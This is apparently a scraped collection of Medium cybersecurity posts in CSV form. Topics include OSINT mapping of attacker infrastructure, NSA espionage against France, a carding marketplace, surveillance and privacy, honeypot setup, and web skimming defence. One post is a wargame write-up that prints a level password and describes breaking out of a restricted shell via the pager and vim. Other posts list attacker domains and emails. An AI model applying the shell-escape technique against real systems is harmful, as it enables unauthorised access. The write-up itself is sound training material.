","['host', 'dig', 'nslookup', 'Quad9', 'GHDB', 'online courses', 'Hunchly', 'Python Tutorial', 'SHODAN', 'Censys', 'BinaryEdge', 'SecurityTrails', 'Robtex', 'HackerTarget', 'VirusTotal', 'Greynoise', 'ViewDNS.info', 'WhoXY', 'SecurityTrails', 'SpiderFoot', 'Maltego', 'theHarvester', 'OSINTcurio.us', 'Awesome OSINT', 'Osint', 'Threat Intelligence', 'Infosec', 'Tools', 'Cybersecurity']"
"OSINT tool for visualizing relationships between domains, IPs and email addresses.",https://medium.com/hackernoon/osint-tool-for-visualizing-relationships-between-domains-ips-and-email-addresses-94377aa1f20a?source=tag_archive---------9-----------------------,"TL;DR
I wrote a script, which takes domain, IP or email address as input and search it in various services like: Whois, Reverse whois, Historical whois,VirusTotal, Threatcrowd and others.Everything is logged into Elasticsearch and json files. Additionally, at the end it creates graph which illustrates all of the connections between resources.
https://github.com/woj-ciech/Danger-zone
I showed how to collect malware samples, analyze them and get command and control servers, now it’s time to going deeper.
There are many cases when you need to map infrastructure used in attack based only on one email address or single domain. It’s tedious work to check everything manually and then connect the dots. Visualizing helps you to get full picture of attacker’s network and then you can go deeper to track as many leads as you can. Every information may be valuable in order to track identity of the threat actor, so if we are able to search for it in multiple sources there is better chance to get some more useful info. In addition, connecting all of this sources and making connections between gathered data allows to fully understand what you are dealing with.
During tracking malicious behavior in Internet, lots of tools are used and main goal of Danger Zone is to connect it into one, give you easy readable output, visualize it as a graph and store rest of data in Elasticsearch and JSON files.
I tried to use as many free of charge services as possible to do it in classic OSINT style and good news is that you need only two keys for using the tool. First of them is Whoxy, which gives you free credits after registration and second is very known VirusTotal (free version allows only 4 requests per minute). Rest of the services are totally free like Trumail for email validation, Extreme IP for IP geolocation or Username Check for checking presence of username in social media sites.
Script goes only 2–3 levels down and shows 3 newest results, just to give you insight, for example what is actually hosted on that IP but all results are saved for further review. It can be used for small-scale investigation or just as a part of bigger ones. Personally, I used it in three investigations, which I will show you next.
Idea for this kind of tool, starts when I came across this disgusting paste:
Someone was sharing CP and left his email for ‘support’. I wonder how much useful information can be gathered to track his identity.
I started from “.net” email address which is located at the center of the graph. With help of reverse Whois module, it found associated “.top”,”.com” and “.biz” domains. They are blurred because of obvious reasons. Then these domains are checked for emails and IPs to give you insight to what IP domain was resolved and what is hosted there right now. Additional information are displayed to console. Last edges show you newest domains hosted on that IP and don’t have to be connected to your target.
The email and username are very unique so I can connect Twitter account to email with medium confidence. We see that this user posted links to google URL shortener (disabled already) with bot-like behavior. Last post was in 2012 but as we can see he still operates.
With help of this tool and other semi-automatic techniques I was able to build network of this kind of websites including emails, records from whois (telephone numbers, address and others), IPs and domains (some of them are still running and sharing disturbing content).
Remember C2 server from my previous article? It were goog[.]com and onedriveservice[.]com. Let’s find out how it looks like on the graph
Here we started from goog[.]com domain. Script found associated IP and one email address, which next is associated with another domains. At the end we can spot that “yahoo.com” address is connected to “.com” email, which then is related to our initial domain goog[.]com.
Graph for onedriveservice[.]com looks like this, we can see it was hosted on 185.106.120[.]202 and this IP is linked to other malicious domains like fakeavhelp[.]website or other weird looking TLD domains.
Spamming campaigns, fake tech supports sites or various other scams have to be hosted somewhere and under some names and emails. I read article about fximperium[.]net case, which originally was posted on one of the polish security sites. Half of the work can be automated here, graph below presents results for domain fximperium[.]net
It is connected to email address gabriel[at]fximperium.com and we found another domain associated with this particular email.
If you need more information like address, surname or other associated domains, you can always reach Kibana. You just need to choose o module (on the left) and then provide your query.
Of course if you don’t have Elasticsearch in place, you can read JSON files, which are created for every checked resource. Example check for module Whois history for fximperium[.]biz.
https://github.com/woj-ciech/Danger-zone
Based on above cases, you saw how easy and fast mapping infrastructure and tracking individuals can be. You can also discover some new leads like historical data from Whois and connect it to new email addresses. This tool can be part of bigger cases as well as separate small tries to identify new potential leads or uncover malicious actors in Internet.
Written by
","['About', 'Help', 'Go Home', 'Osint', 'Security', 'Cybercrime', 'Cybersecurity', 'Tracking']"
"Oui, La NSA hacked France in 2012 - Matt Suiche - Medium",https://medium.com/@msuiche/nsa-hacked-france-in-2012-414d8de4bdcf?source=tag_archive---------0-----------------------,"If you speak French and have one hour available, just skip the article and go straight to the video. Otherwise, here are some notes from the video interview.
Le Monde just published an article confirming that the U.S. (NSA) indeed hacked the French White House (Elysee) in 2012.
This claim is based on a video interview done at a French Engineering School and had been uploaded on June 18 2016 of Bernard Barbier former head of the French Intelligence Service (DGSE).
Unfortunately, as the comments on YouTube can attest — the sound quality is pretty mediocre which explains why it took so long for someone to actually write something about it (3 months!).
Barbier mentions his official visit with Mr Patrick Pailloux, Head of the French NSA (ANSSI) to Keith Alexander (former Director of the NSA) in order to complain and showing all the evidences of the 2012 Hack of the Elysee on request from the President Francois Hollande.
This is the first time that this hack had been officially confirmed — until now the only “suspicions” were due to the above memo, that got disclosed through the Snowden documents.
“I received the order from the successor of Mr Sarkozy (Francois Hollande) to go in the U.S. to shout at them. We were sure it was them. At the end of the meeting, Keith Alexander (Director of the NSA) was not happy. When we were in the bus, he told me he was disappointed because he never thought we would detect them and he even added “You guys are good”. The major Allied Powers, we do not spy on them. The fact the U.S. broke this rule was a shock” — Bernard Barbier
Barbier mentions that they randomly discovered the malware through existing signature which was similar to the 2010 hack of the European Commission — which had been reversed by his team of reverse engineers.
Barbier also mentions he enjoyed working with the U.S., U.K. and the Israelis in 2006 — because they were the strongest actors in the cyber security industry.
Although Barbier says the relationship with the U.S. isn’t tense as in the Intelligence World you don’t have friends but only allies — and the U.S. is the best ally France has — he continues by admitting the difference in term of capacities between the French and the U.S. agencies, with a workforce 20 times bigger, and a budget 40 times bigger.
Barbier highlights even though they have lots of money, the Americans are wasting a lot of money — but the French capacities are not matching the military & strategic expectations of the French government especially given the fact that France decided to be involved in foreign countries such as Mali and Syria. He follows by comparing that GCHQ (UK) & 8200 (Israel) have twice more resources.
Barbier also confirms that BABAR, which was analyzed by Marion Marschalek in 2015 was indeed French — and jokes that the Canadian find out because the French developer who did it used the “BABAR” and “TITI” strings which are popular French cartoon characters — and that it was a stupid mistake from the developer. #OPSECFAIL
Barbier evokes the creation of an European Intelligence Service to provide better performances but this would unfortunately be impossible as it would mean that 28 different countries with different cultures and languages would need to collaborate efficiently.
On Daesh, Barbier explains that HUMINT could have been very useful in 2012 — but that this is unfortunately almost impossible as those circles are very difficult to infiltrate as terrorist groups are very careful with insiders as they only work with people they know. Moreover, he mentions that he does not know if the Algerians and Moroccans services had additional information — given the fact that most of those subjects are from Maghreban origins.
Barbier also admit that information security is not really recognized in France, especially during the 2000s and that most of the people who are working in big French groups doing information security are inexperienced. He also says that France only has 50–60 skilled pentesters, and the problem they have to recruit is that since being a hacker is not an academical skills — it is very hard for them to recruit people who are “wired correctly” who started early enough and that finishes by saying that France needs to develop more technological branches to train people on cyber-security matters.
Barbier also mentions the creation of the Chinese Cyber Unit within the People’s Liberation Army in the late 90s to be able to compete with the U.S. now instead of in 50–60 years.
Another surreal part is when Keith Alexander told Bernard Barbier about the “Find & Fire” projects they have in Iraq to identify (within a 7km radius) & eliminate bad guys with drones. So apparently France is working on similar technologies as Barbier managed to convinced them to do the same, and they need more students to join the government to improve the technology — which had been used in 2010 to prevent a terrorist attack against the French Embassy in Mauritania.
Barbier also jokes (at 55:20) that in France unlike in the U.S. we do care about avoiding “collateral damages” before neutralizing a target.
Written by
","['Cybersecurity', 'ISIS', 'France', 'Hacking']"
"Over 750,000 debit and credit cards for sale found on the deep web",https://medium.com/beyond-the-perimeter/over-750-000-debit-and-credit-cards-for-sale-found-on-the-deep-web-434e050ac59f?source=tag_archive---------1-----------------------,"Despite all the scaremongering by popular media, the Internet’s dark side, hyped as the Deep Web or the Dark Web, isn’t actually all that big. It is overestimated, often to silly proportions, by folks not really familiar with the intended connotation of ‘dark web’, clubbing everything unindexed and password protected with all that’s concerning.
That doesn’t mean it is any less threatening than its made out to be, especially this year. After Android.banker.A2f8a targeted top Indian banks like HDFC Bank, ICICI Bank, and Axis Bank, we can now confirm that almost 700,000 Indian credit card details are available for purchase as low as $4.90 a piece. While we can’t comment on whether it was Android.banker.A2f8a, the flavor of card data available, the number of source countries, and the frequency of data updations tells us this is one or a number of banking trojans at work.
ThreatLandscape’s threat intel platform, crawling both open and the darker deep web, detected cvv-me.su and flagged it for further investigation. After some cursory research, it became clear CVV.ME, true to its name, didn’t just have names, card numbers, and other demographic info but also CVVs, those three little numbers on the back of credit cards that, in most countries, are the last line of defense against card theft.
Sophisticated in its design, full-filter enabled, and offering live chat support, CVV.ME allows one to see card details by country, CVV, and even SSN. For verification, it allows buyers to see Bin, the Base (indicating the source of collection) and a confidence score on validity. Cards from the US cost between $9.99 to $19.99 a piece.
https://cvv-me.su was registered on 25th August, 2016 and last updated on 23rd February, 2018.
While it was taken down on 5th August, 2017, it came back up a couple days later and as of the writing of this article, it was alive and kicking with updates (read: fresh data) coming in with alarming frequency.
First registered by baenko-marina@bk.ru, the owner’s e-mail was later changed to gergk34@mail.ru. Further analysis showed 11 similar domains associated with the op.
They even run these sites on SSL certs from GlobalSign and COMODO thus lending to the idea that this isn’t a bunch of kids playing in the banks’ backyards. Folks behind the op also take care to change the hosting server once every month or so as they gain popularity and become open to takedowns.
CVV.ME isn’t the only one of its kind of course. UniCC, among many, many others, even has a promotional YouTube video exhorting their commitment to ‘your profits’.
On 29 January, 2018, a huge dump of Indian credit cards’ details was added to the site.
Almost all the top Indian banks found mention on the site with Bank of India at #1 with 133,912 cards closely followed by HDFC with 112,264 and SBI at #3 with 106,694 cards.
While some reports suggested Punjab National Bank had only 1,000 to 10,000 of its customers affected, we found CVV.ME has 22,390 of the bank’s customers’ details on it at the time of publishing, adding to the bank’s current woes.
We tried getting an operator of the site to respond to what we thought would be an interesting query but nada. The site’s hosted in Russia so we’re hoping they’re asleep and will respond when they wake up. Or maybe they’re inundated with orders and don’t really care for queries about the quality of the data. After all, $4.90 isn’t a lot at all even for cards with low credit limits.
ThreatLandscape is a cyber threat intel solutions company monitoring the open and the scarier aspects of the deep web for brand mentions, infrastructure disclosures, third-party data leaks, and more. Our human+machine intelligence framework allows us to not just quickly alert our customers to sites like CVV.ME but also work with authorities to remediate such situations.
Written by
","['FUD', 'TL', 'Product', 'ThreatLandscape', 'Deep Web', 'Darkweb', 'Threat Intelligence', 'Cybersecurity']"
OverTheWire’s Bandit 25 -> 26 Shell - coturnix97 - Medium,https://medium.com/@coturnix97/overthewires-bandit-25-26-shell-355d78fd2f4d?source=tag_archive---------9-----------------------,"Link: http://overthewire.org/wargames/bandit/bandit27.html
So it might seem a bit random that I’ve decided to do an OverTheWire Bandit writeup, particularly because I’m starting the writeup at level 25, but there is some context behind it.
I remember first trying to do the Bandit challenges a couple of years ago and, not knowing how to SSH into a machine, I gave up after about two hours of trying. In my defence, my Windows 7 computer at the time couldn’t have done it without installing Putty and I didn’t know what Linux was.
I tried again after about a year and followed a lot of tutorials to get most of the way through it, however I wasn’t very familiar with the command line at the time.
This week, I decided to have a look at the set of challenges again, now feeling a lot more confident in Linux. It was great to see the progression I’d made, but I still had to Google some hints for a few of them (level 25 is one of those). But what I noticed was that levels 26 onwards were new, I don’t know when they added them in but I didn’t remember them at all.
For this reason I thought I would put up my own writeups of these new challenges as I couldn’t see many writeups for them online.
I am starting with the old 25->26 level because while the difference between getting the level 26 password and getting the level 26 shell is only a few lines, a Google search showed that there aren’t many writeups which cover it (likely because you didn’t need a shell on it when 26 was the last level).
For those who did the original challenges years ago and want to follow along from 25, I will post the level 25 password below, if you haven’t done the rest before though then I recommend doing them, they’re worth your time.
Enough talking, let’s get started.
The challenge description is shown on the site:
Firstly we’ll ssh into the server and have a look in the home directory:
So there’s a key here, this must be what they’re referring to when they say that connecting to bandit26 “should be” easy. Let’s try ssh’ing into bandit26 and see what happens.
Well it kicks us straight back out, guess it’s not that easy. The challenge mentions that the shell for bandit26 isn’t bash, so let’s see what it has instead.
/usr/bin/showtext? Definitely doesn’t seem standard. We’ll have a look inside it (it’s a bash script so I’m just going to use cat).
So it calls more on a file in its home directory then exits, pretty limited. I’ll be honest that I didn’t come up with the solution myself and needed some external help (OK Google, how do you solve Bandit level 25?), but it’s a pretty random way to solve the challenge so good work to those of you who could think that far outside the box.
What we need to do is to trigger more to go into its command view so that the program doesn’t just exit. In other words, make your terminal as small as possible then ssh in.
Yep, that’s the way to break out. Very out of the box to get out of the box.
So now we’ve got more working, what can we do with it? Well in more you have a few commands, one of them letting us open the file in vim. All we have to do is press v on the keyboard. (If you want more information check the man page)
I now have vim running on the file. I’ve also rescaled my windows so that I can actually see.
Here’s where my writeup will deviate from what you normally find online. I will first show how to get the password for level26, then I will show you how to get a shell. Most people seem to just get the password, however if you ssh in with the password you will still get kicked back out again so you won’t be able to get to level 27.
So now we have vim, we can open another file using the :e command. We will want the bandit26 password so this is the command we will use:
If you’re unfamiliar with vim, make sure you press escape to enter command mode (it’s in there automatically but if you pressed any other keys you may need to change back to it).
Ok so the password is 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z, but we haven’t got a shell and ssh’ing in with it will still just leave us in that showtext script from earlier. So how can we get to a shell from vim? Well from looking up vim in Google, vim has a shell command. So if we type :shell then it should return us into a shell, seems pretty easy.
What? It just put us back into more. Well that’s not that helpful we’ve just done a full loop. Why would vim put us into more when we asked for a shell? Pretty much, vim knows that the shell for bandit26 is the showtext file and it stores this in a variable called shell. So if we want to break out we need to change this variable first. So we get back into vim and use the following command to set that value
After that we can now tell vim to start a shell with :shell and…
We’ve got a shell!
Once again, I’ve basically uploaded this as a prerequisite to the newer Bandit challenges. My level 26 -> level 27 writeup will assume that you’re in this shell already.
Written by
","['Hacking', 'Linux', 'Command Line', 'Overthewire', 'Cybersecurity']"
Paranoia Is Now a Best Practice - Featured Stories - Medium,https://medium.com/s/story/paranoia-is-now-a-best-practice-3b1adb8980ed?source=tag_archive---------2-----------------------,"The 2010s will be remembered as the first decade in which we, the people, paid for the pleasure of welcoming Big Brother into our lives. When George Orwell depicted an inescapable surveillance state — telescreens in every room monitoring every move, recording every sound, and reporting it all to the authoritarian leader — in his classic novel 1984, he probably never imagined that in 2018, folks would pay $600 (plus a recurring monthly fee) for the privilege of carrying a telescreen in their pockets.
China’s surveillance apparatus includes facial recognition technology connected to an expansive network of CCTV cameras and to camera-sunglasses that police officers wear; soon it will be connected to a flock of drones disguised as birds. The Chinese government has also announced they will soon be requiring facial scans at train stations as part of their growing dragnet.
Some Chinese citizens are even being required to install special software on their phones that tracks what they download. Footage from surveillance cameras, tweets, Facebook posts, and attempts to visit banned or otherwise “bad” websites can all affect your “social credit score,” which has been used to prevent “risky” citizens from doing all kinds of things, from buying airline tickets to getting your kids into private school.
The recent expansion of the surveillance state is not limited to historically authoritarian regimes. The United States has had its own share of frightening tools at its disposal, including the NSA’s PRISM program, famously exposed by whistleblower Edward Snowden. Under PRISM, the NSA has been collecting and storing massive amounts of data about internet traffic. Information found in the Snowden dumps and subsequent revelations have implicated the NSA in repeated (sometimes successful) attempts to break public encryption standards, such as the Diffie-Hellman key exchange. Doing so allows them to read huge swaths of information which was thought (and intended) to be private.
In the name of security, similar high tech surveillance and data collection policies are being rolled out all across Europe. Worldwide authoritarianism is on the rise, and the yearly Freedom on the Net reports express a commensurate rise in online censorship. From the 2017 report:
Online content manipulation contributed to a seventh consecutive year of overall decline in internet freedom, along with a rise in disruptions to mobile internet service and increases in physical and technical attacks on human rights defenders and independent media.
Nearly half of the 65 countries assessed in Freedom on the Net 2017 experienced declines during the coverage period, while just 13 made gains, most of them minor. Less than one-quarter of users reside in countries where the internet is designated Free, meaning there are no major obstacles to access, onerous restrictions on content, or serious violations of user rights in the form of unchecked surveillance or unjust repercussions for legitimate speech.
Governments around the world continue to become more tech savvy. In authoritarian regimes, this means better surveillance, more censorship, and powerful disinformation tactics. Some people argue that spy agencies exist to protect their citizens, and therefore these advancements are for the best. But even if we trust our own government, advancements in surveillance and cyber warfare are not without risk.
The extraordinary viruses Flame and Stuxnet were jointly developed by the U.S. and Israeli governments and share several components. Stuxnet is considered by some to be the most impressive piece of software ever created. It hijacked critical pieces of Microsoft infrastructure to spread itself to millions of computers worldwide, disguised as a legitimate Microsoft update. Both worms automatically copied and installed themselves onto USB drives and other peripherals. The Flame variant was able to turn on cameras and microphones, monitor web traffic, and much more.
These two viruses were unleashed worldwide with the stated goal of infecting and disabling Iranian nuclear facilities — at least that’s the story — but even if you trust your government to do the right thing with this software, having the code at all makes the government a target.
The Shadow Brokers are a hacker group who specialize in the sale of stolen hacks. Infamously, the Shadow Brokers stole critical technology from the NSA which would become the WannaCry ransomware worm that infected millions of computers in 2016. Perhaps the NSA never intended to use those technologies for evil, but does intent matter if they’re unable to prevent their code from being stolen?
As a society, we are only beginning to grapple with all the ways data can be weaponized. Yet we are in the middle of the big-data revolution.
As if this weren’t enough, spying isn’t just for governments anymore. Facebook, Google, and so many others are engaged in broad-daylight surveillance efforts that are intended to help them sell advertisements, make more “data-driven” decisions, and “understand their customers.” Selling ads is a pretty banal goal, but the information captured can also be used to more nefarious ends, e.g. the Cambridge Analytica scandal. What’s more, the data they collect is a high-value target for government agencies or non-state hacker groups who may be seeking to dox, blackmail, or steal the identity of people whose data they can intercept.
As a society, we are only beginning to grapple with all the ways data can be weaponized. Yet we are in the middle of the big-data revolution. Machine learning algorithms that process huge datasets are in the limelight in Silicon Valley and beyond. Plucking valuable jewels out of the noise of everyday internet traffic is easier every day.
Unfortunately, the worst vulnerabilities are largely unseen, and the worst abuses of our data have yet to come. Worse, some of the most concerning attack surfaces are built into the fabric of the internet itself, putting us all at risk.
Maybe you think you are safe.
You use a password manager. You randomly generate strong and unique passwords for every website. You’ve got tape over your webcam. You’ve disabled JavaScript. You block ads. You never login to unsecured WiFi access points. You encrypt. You use a prepaid burner phone. You use a VPN that uses Tor. And no, that room in your basement is not a “glorified tinfoil hat,” it’s a Faraday cage, thank you very much.
Unfortunately, even an extraordinary personal commitment to security is not enough to fully protect your data.
The truth is that modern web infrastructure has created a tangle of vulnerable systems. If your data passes through an insecure intermediary, you are now at risk — regardless of your own behavior. Your friends are storing the texts you sent them. Facebook stores pictures your friends took of you. Google stores your web search history and your location history, then sells that data to advertisers. Snap stores your Snaps. The list goes on.
Google provides users with options to turn this tracking off (deeply buried in their settings) but the only way to be sure your data is never on an insecure system is to never send your data using the internet.
Just kidding. Even if you’ve never used the internet, the modern world has used it on your behalf.
Equifax — a service that literally no one opts in to — exposed over 145 million social security numbers. The population of the United States is roughly 325 million, which means there is a 44% chance yours was stolen — in just this one attack. By the way, driver’s license numbers, dates of birth, credit card numbers, phone numbers, and tax identification numbers were also stolen in this data heist.
Anytime you engage in a financial transaction, there is a good chance it’s being entered into a database, and that database is likely connected to the internet. Governments are increasingly making information about citizens available online. Your friends, colleagues, and acquaintances also leave a trail of information online; tweets, Facebook posts, pictures, and messages about you — not even to you — can be used by organizations trying to track you.
Baratunde Thurston’s excellent and unnerving Data Detox in a Zillion Easy Steps captures a portion of the tangled web that makes up one’s digital footprint. Facebook shares data with third party apps, which developers can store in their own database. As we saw with Cambridge Analytica, that data can then be sold to a fourth party (and a fifth, and a sixth). That data might ultimately end up in the hands of a political action group, the Russian government, an advertising firm… anyone, really.
While we have precious little control over how our data is used by organizations, we have even less control over how our data is transmitted across the physical machinery of the internet.
Today, more than two quintillion bytes of data — that’s a two followed by 18 zeros — will be transmitted on the internet. Sometimes as radio waves. Sometimes as electrical signals. Sometimes as blasts of light, by way of laser or fiber optic cables. On the way to its destination, your data will pass through several different computers, any of which could be logging information about your IP address, the type of requests you make, the frequency with which your traffic passes through this computer, the size of the data you transmit and receive, and the list of IP addresses you send data to and receive it from. The Snowden dump revealed that the NSA is in fact logging this kind of information on a massive scale.
Information about which movies you watch, how often you Skype your mom, your favorite songs, and everything else you do on the internet is transmitted over potentially compromised infrastructure. Once it reaches its destination, your data is stored in other potentially compromised infrastructure. In many cases, ambitious third parties can snatch an alarming amount of this information out of thin air without being a major provider.
Devices on the Internet of Things will also be vulnerable to clever attacks that cause our devices to behave in unexpected and unanticipated ways.
If your connection is not encrypted, anyone on the datapath can readily log all the data you send and receive. Encryption goes a long way to protect the content of your messages. But unfortunately, encryption alone is not enough. Combining encryption with anonymity-focused tools such as VPNs and mix-nets can help mitigate these metadata leaks. One such tool, Tor, is a system that attempts to hide the source and destination IP addresses by using several proxies that all have limited knowledge themselves about the true source and destination. The technical details are vast, but maybe a metaphor is helpful:
Imagine you’re writing a letter to your friend Tim. You wish to disguise your location, so you enlist a network of individuals — Alice, Bob, and Charlie — who will forward letters sent to them, no questions asked (they are the Tor network). You put your letter in an envelope addressed to Tim, then you put that envelope in an envelope addressed to Charlie, then you put Charlie’s envelope in an envelope addressed to Bob, then you put Bob’s envelope in an envelope addressed to Alice. Then you put that nested set of envelopes in the mail.
Someone spying on your letters, but not spying on Alice, will see that you sent a letter to Alice. Someone spying on your friend Tim will know that Charlie sent Tim a letter. Someone spying on Bob wouldn’t even know you and Tim know each other. It’s not a perfect metaphor, but this is roughly how Tor helps protect your anonymity online: by obfuscating the true source and destination of internet traffic.
Tor and other similar systems are still vulnerable to something called correlation attacks, where an adversary who is watching your connection and Tim’s connection can use metadata to deduce that the two of you are communicating. This is harder and takes a sophisticated, powerful, and motivated adversary — still, it’s worth noting that nothing is going to give you perfect anonymity on the internet.
Just as there are more ways to transmit data than ever before, more machines are talking and listening to each other. The Internet of Things continues to grow as watches, toaster ovens, refrigerators, fish tanks, thermostats, and more get connected to the internet. Tiny computers have pervaded nearly every aspect of our modern lives, and all of these devices are a new potential security risk — either as a device that creates data worth stealing, captures data worth stealing, or as a potential weak point to infiltrate your network.
Devices on the Internet of Things will also be vulnerable to clever attacks that cause our devices to behave in unexpected and unanticipated ways. For example, hackers have found ways to turn speakers into microphones and listen to you even on devices that are only supposed to make sound. In one particularly creepy study, scientists were able to listen to the sound of subjects typing their passwords into a keyboard and accurately guess those passwords 80% of the time. That was in 2005, by the way; the field of audio processing has advanced significantly since then. Imagine what else could be deduced from sounds you assumed were innocuous.
A fish tank thermometer was used to steal money from a casino. This wasn’t because the fish tank had direct access to financial transactions — instead, the fish tank was a weak point in an otherwise secure casino network. While the details of the hack were not made public, attackers likely exploited a combination of poor security practices (e.g. casino employees did not think the thermometer needed to be secured the same way other network devices needed to be) and poor security infrastructure (e.g. the thermometer manufacturers hardware/software was easier to crack than other devices on the network).
Hackers have been able to break into the computer systems of cars and remotely turn off the engine, slam the breaks, turn the wheels, accelerate, and more. Every single device with an internet connection is a potential attack vector.
Exacerbating the problem is that all of these devices, and the infrastructure connecting them, are powered by software that is often insecure. Take the Domain Name System (DNS). The Domain Name System is a crucial piece of computer infrastructure, and also a well-known privacy and security risk.
If you do not manually configure your computer’s DNS settings, you’re probably sending the list of every website you visit, when you visit them, and how frequently you visit them through public channels with zero encryption. By default this information will be sent to your ISP, who will then provide you with the IP addresses for the names you send such as “google.com”. All of this information could be stored indefinitely in an NSA operated data storage facility in Bluffdale, Utah (hypothetically speaking).
DNS’s weaknesses have also been exploited in high-tech data heists as well. Instead of logging DNS information, attackers use weaknesses in DNS and one of the major protocols powering internet traffic routing (the Border Gateway Protocol, or BGP) in order to steal login credentials in a phishing attack. In one such attack, over $150,000 in cryptocurrency was stolen from users of the trading website MyEtherWallet.
The attack was quite sophisticated. First, attackers maliciously rerouted internet traffic to compromised infrastructure using a well-known exploit called a BGP leak. Second, redirected traffic was corrupted — specifically, DNS queries related to MyEtherWallet.com were “poisoned” to send users to a phishing website. Third, when users unwittingly typed their passwords into the phishing website, attackers used the stolen credentials to steal their cryptocurrency.
BGP leaks, DNS poisoning, and bugs like the Heartbleed vulnerability found in the widely-used encryption package OpenSSL are especially concerning because they impact all internet users and offer affected users little-to-no recourse.
As the scope of the available data has grown, so has our data-processing prowess. Big data is the new normal, and advances in machine learning have created even more thirst for massive datasets. The alarming amount of data that can be harvested from us is becoming more valuable with every step forward in artificial intelligence.
At the same time, we are slowly waking up to the idea that machine learning and data science is not objective. Datasets reflect the same biases of the conditions in which they are built. Algorithms and statistical models are built by people and companies with agendas, which are reflected in the functions of those algorithms and models.
There are plenty of examples of algorithmic prejudice. Google’s search algorithm came under scrutiny when people discovered that searching for “unprofessional hairstyles” disproportionately showed images of black women (who had perfectly professional hairstyles). Google removed the “gorilla” classification from some of its image recognition algorithms after it classified several pictures of black men as gorillas. ProPublica reported on a deeply troubling example of algorithmic bias, where programs used as part of courtroom procedures for setting bail, determining sentencing, and granting parole consistently over-penalized black people and under-penalized white people.
Coming to terms with our new interconnected reality will be a process, not a destination.
These results suggest that being “data driven” isn’t exactly the same as being “objective.” They call into question the applicability of current state-of-the-art machine learning algorithms, especially in areas already mired with racial prejudice such as law enforcement. Even so, the idea that algorithms could be a solution to government discrimination persists among the most devote technology acolytes.
There are also some encouraging signs of emerging skepticism. Google’s Project Maven and Amazon’s Rekognition AI tools both made headlines when the companies revealed negotiations to sell their products to the military. Employees at both companies staged protests, wrote letters to corporate leadership, and threatened to quit. The solidarity of technology workers, who are in high demand, worked. Rekognition was pulled by the Orlando police department. Google dropped out of Project Maven. The surveillance industrial complex — well established as it is — is not undefeatable.
Europe has been leading the way in digital regulation. The right to be forgotten has resulted in over 650,000 requests to delete data. The General Data Protection Regulation (GDPR) is hitting corporations in the pocketbook with Facebook and Google looking at fines in the billion dollar range.
Personal mitigation strategies, such as using a password manager, installing privacy tools like the EFF’s HTTPS Everywhere browser extension, and switching to a DNS provider like CloudFlare’s 1.1.1.1 which uses encrypted DNS protocols, can help. Unfortunately, personal actions will never be enough. Combating the combined strength of large organizations like the NSA, Google, and other surveillance giants will take organized effort.
As technology continues to invade the most private aspects of our life, we must continue to bring the more frightening aspects of this new reality into the light. We must demand that corporations and governments be more transparent about the data they collect. Coming to terms with our new interconnected reality will be a process, not a destination. The more we all learn about data, privacy, and surveillance, the more we can bring these problems into the mainstream consciousness, where they can actually be solved.
Written by
","['Privacy', 'Technology', 'Cybersecurity', 'Data Science', 'Data Security']"
Part 1: Modern Honey Network (MHN) — Installing Server on EC2 Instance,https://medium.com/@s.on/part-1-modern-honey-network-mhn-installing-server-on-ec2-instance-9144242acbb8?source=tag_archive---------3-----------------------,"Today, I’m going to show you the steps on how to deploy Modern Honey Network (MHN). The Modern Honey Network project makes deploying and managing secure honeypots extremely simple. Honeypots offer a powerful and exciting way of learning about attackers’ presence and methods. They contribute towards a security program that incorporates deception. However, honeypots can be tricky to set up and oversee. The open-source tool Modern Honey Network (MHN) by Anomali Inc (formerly known as ThreatStream) drastically simplifies the tasks of installing and managing low-interaction honeypots. Armed with MHN and access to an inexpensive public cloud provider, anyone can start experimenting with and learning from honeypots.
I’ve tested installing the MHN Server on a Ubuntu 14.04 image (t2.small instance type) with 40GB storage & 2GB memory. So far, it has been working well with no hiccups! Once you have SSH into your fresh EC2 instance with your private key, run the following commands:
You’ll be prompted for a few configuration parameters, including the desired login email and password.
To make sure everything is in order, issue these 3 commands and your output should be the same as below (all processes should be “RUNNING”):
Should mhn-celery-worker process be showing as “FATAL”, fret not! Try this instead:
By default, the MHN server send anonymous data of attacks to ThreatStream. If you would like to disable it, run the following command:
Note: Under your EC2 instance’s Security Groups, please ensure that port 80, 22, 3000, 10000 are open.
Once the installation completes, you can connect to MHN Server web interface by directing your browser to the server’s IP address or hostname, at which point you’ll have the opportunity to log in.
Voila! Your MHN server is now running perfectly! Remember the superuser email and password you gave during the initial configuration? Use that for the login to your MHN server.
The next part that I’m going to share will be the installing of MHN Sensor on a separate EC2 Instance. Stay tuned! :)
Written by
","['Security', 'Cybersecurity', 'Honeypot', 'Ec2', 'Infosec']"
Part 2: How to stop me harvesting credit card numbers and passwords from your site,https://medium.com/hackernoon/part-2-how-to-stop-me-harvesting-credit-card-numbers-and-passwords-from-your-site-844f739659b9?source=tag_archive---------1-----------------------,"I wrote a post recently describing how I distributed malicious code that gathers credit card numbers and passwords from thousands of sites in a way that’s quite difficult to detect.
The comments this post received filled me with joy, expressing such sentiments as “chilling”, “disturbing”, and “utterly terrifying”. (Much like the compliments I receive on the dance floor.)
In this follow-up post I’d like to put down the megaphone and put forward some practical advice.
You might also consider avoiding sensitive data entirely by using third-party sign-in and a third-party to collect and handle credit card information.
The things I suggest in this post only really work for sites where sensitive information is quite limited and can be cordoned off (passwords, credit card numbers, etc). If you work on a chat app or an email client or a database GUI, where everything is potentially sensitive, I’ve got nuthin’.
I think a healthy dose of fear is a good place to start.
I suggest pondering how you would feel making an announcement like OnePlus had to recently:
… a malicious script was injected into the payment page code to sniff out credit card info while it was being entered… The malicious script operated intermittently, capturing and sending data directly from the user’s browser … up to 40k users at oneplus.net may be affected by the incident
Oof.
Now let’s sharpen that vague sense of dread into something more specific.
Perhaps an animalogy will prove useful…
I imagine third-party code as a big ol’ doberman. He looks calm; gentle, even. But there are flickers of an unknown potential in his dark, unblinking eyes. Let’s just say I’m not putting anything I hold dear near his pointy end.
I picture my users’ sensitive information as a cute, defenceless hamster. I watch as it innocently licks its little front feet, grooming its dumb little face, frolicking without a care at the base of the doberman.
Now, if you’ve ever been friends with a doberman (I highly recommend it), you probably know that they are wonderful, gentle creatures and don’t deserve their reputation for being vicious. But still, I’m sure you’ll agree it’s a bad idea to leave one alone with a hamster that bares a striking resemblance to a chew toy.
Sure, maybe you’ll come home from work to the adorable scene of Professor Baggy Pants asleep on the back of Sergeant Chompers. Or maybe you’ll come home to witness only air where the hamster used to be, and a dog with his head cocked to one side, like “may I see the dessert menu?”
I don’t think code that comes from npm, GTM or DFP or anywhere else should have a reputation for being necessarily dangerous. But I’d suggest that unless you can guarantee the good behaviour of this code, it’s irresponsible to leave it alone with your users’ sensitive information.
